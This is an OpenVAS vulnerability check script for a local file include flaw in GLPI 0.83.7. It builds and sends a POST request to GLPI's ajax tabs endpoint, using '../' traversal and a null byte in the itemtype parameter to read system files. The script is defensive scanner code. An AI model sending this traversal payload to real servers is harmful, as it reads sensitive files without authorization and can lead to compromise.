###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_glpi_lfi_06_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# GLPI Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "GLPI is prone to a local file include vulnerability because it fails
to adequately validate user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts. This could
allow the attacker to compromise the application and the computer;
other attacks are also possible.

GLPI 0.83.7 is vulnerable. Other versions may also be vulnerable.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103743";
CPE = "cpe:/a:glpi-project:glpi";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("GLPI Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5145.php");
 
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-06-20 11:59:55 +0200 (Thu, 20 Jun 2013)");
 script_description(desc);
 script_summary("Determine if is is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_glpi_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("glpi/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = dir + '/ajax/common.tabs.php';
host = get_host_name();

files = traversal_files();

foreach file (keys(files)) {

  ex = 'target=/glpi/front/user.form.php&itemtype=' + crap(data:"../", length:9*6) + files[file] + '%00User&glpi_tab=Profile_User$1&id=2';
  len = strlen(ex);

  req = string("POST ", url," HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Length: ", len,"\r\n",
             "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0 OpenVAS\r\n",
             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
             "Accept-Language: en-US,en;q=0.5\r\n",
             "Accept-Encoding: Identity\r\n",
             "X-Requested-With: XMLHttpRequest\r\n",
             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
             "Referer: http://",host,"/glpi/front/user.form.php?id=2\r\n",
             "\r\n", ex);


  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(eregmatch(pattern:file, string:result)) {

    security_hole(port:port);
    exit(0);

  }

} 

exit(99); 
